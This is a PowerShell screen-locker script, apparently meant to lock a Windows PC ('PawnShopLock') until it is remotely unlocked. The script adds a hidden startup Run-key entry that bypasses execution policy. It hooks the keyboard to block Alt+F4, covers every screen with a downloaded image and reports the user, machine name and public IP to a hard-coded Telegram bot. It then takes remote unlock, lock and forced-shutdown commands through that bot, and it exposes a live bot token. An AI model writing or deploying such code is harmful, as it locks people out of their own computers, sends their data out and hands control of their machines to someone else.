# ---------------- SETTINGS ----------------
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"
$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$chatID = "656189986"
$pc = $env:COMPUTERNAME
$user = $env:USERNAME
$unlockCommand = "/unlock$user".ToLower()
$lockCommand = "/lock$user".ToLower()
$shutdownCommand = "/shutdown$user".ToLower()
$lockFile = "$env:APPDATA\lock_status.txt"

# ---------------- STATE CHECK ----------------
if (-not (Test-Path $lockFile)) { "locked" | Out-File $lockFile -Force }
$state = Get-Content $lockFile -ErrorAction SilentlyContinue
if ($state -eq "unlocked") { return }

# ---------------- STARTUP ENTRY ----------------
$RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$RunName = "PawnShopLock"
try {
    if ($MyInvocation.MyCommand.Path) {
        $startCmd = "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
        Set-ItemProperty $RunKey -Name $RunName -Value $startCmd -Force
    }
} catch {}

# ---------------- TELEGRAM NOTIFY ----------------
function Send-Telegram($text) {
    $body = @{ chat_id = $chatID; text = $text } | ConvertTo-Json -Compress
    Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
}
try {
    $ip = (Invoke-RestMethod "https://api.ipify.org") -replace "`n", ""
} catch { $ip = "Unknown" }
$msg = "🔒 PC-ul $user ($pc) a fost blocat.`nIP: $ip`nComenzi:`n$unlockCommand`n$shutdownCommand`n$lockCommand"
Send-Telegram $msg

# ---------------- DOWNLOAD IMAGE ----------------
Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing

# ---------------- BLOCK ALT+F4 ----------------
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
public class KeyBlocker {
    private static IntPtr hookId = IntPtr.Zero;
    private static LowLevelKeyboardProc proc = HookCallback;
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_SYSKEYDOWN = 0x0104;
    [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc proc, IntPtr hMod, uint threadId);
    [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr h);
    [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr h, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string name);

    public static void Block() {
        using (var curProcess = Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule) {
            hookId = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }
    public static void Unblock() {
        UnhookWindowsHookEx(hookId);
    }
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) {
            int vkCode = Marshal.ReadInt32(lParam);
            if ((int)wParam == WM_SYSKEYDOWN && vkCode == 0x73) return (IntPtr)1; // ALT+F4
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
}
"@
[KeyBlocker]::Block()

# ---------------- UI IMAGE FULLSCREEN ----------------
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$forms = @()
foreach ($s in [System.Windows.Forms.Screen]::AllScreens) {
    $form = New-Object Windows.Forms.Form
    $form.FormBorderStyle = 'None'
    $form.WindowState = 'Maximized'
    $form.TopMost = $true
    $form.Bounds = $s.Bounds
    $form.KeyPreview = $true
    $form.Cursor = [System.Windows.Forms.Cursors]::None
    $form.Add_KeyDown({ if ($_.KeyCode -eq 'C') {
        "unlocked" | Out-File $lockFile -Force
        Remove-ItemProperty $RunKey -Name $RunName -ErrorAction SilentlyContinue
        $script:AllowClose = $true
        [System.Windows.Forms.Application]::Exit()
    }})
    $form.Add_FormClosing({ if (-not $script:AllowClose) { $_.Cancel = $true } })

    $pb = New-Object Windows.Forms.PictureBox
    $pb.Dock = 'Fill'
    $pb.Image = [Drawing.Image]::FromFile($tempImagePath)
    $pb.SizeMode = 'StretchImage'
    $form.Controls.Add($pb)

    $form.Show()
    $forms += $form
}

# ---------------- TELEGRAM LISTENER ----------------
$offset = 0
try {
    $r = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates"
    if ($r.result.Count -gt 0) { $offset = ($r.result[-1].update_id + 1) }
} catch {}
$timer = New-Object Windows.Forms.Timer
$timer.Interval = 5000
$timer.Add_Tick({
    try {
        $url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
        $r = Invoke-RestMethod $url
        foreach ($u in $r.result) {
            $offset = $u.update_id + 1
            $cmd = $u.message.text.ToLower()
            if ($cmd -eq $unlockCommand) {
                "unlocked" | Out-File $lockFile -Force
                Remove-ItemProperty $RunKey -Name $RunName -ErrorAction SilentlyContinue
                $script:AllowClose = $true
                [System.Windows.Forms.Application]::Exit()
            }
            elseif ($cmd -eq $shutdownCommand) {
                "unlocked" | Out-File $lockFile -Force
                Stop-Computer -Force
            }
            elseif ($cmd -eq $lockCommand) {
                "locked" | Out-File $lockFile -Force
                if ($MyInvocation.MyCommand.Path) {
                    Set-ItemProperty $RunKey -Name $RunName -Value $startCmd -Force
                }
            }
        }
    } catch {}
})
$script:AllowClose = $false
$timer.Start()
[System.Windows.Forms.Application]::Run()

# ---------------- CLEANUP ----------------
$timer.Stop()
[KeyBlocker]::Unblock()
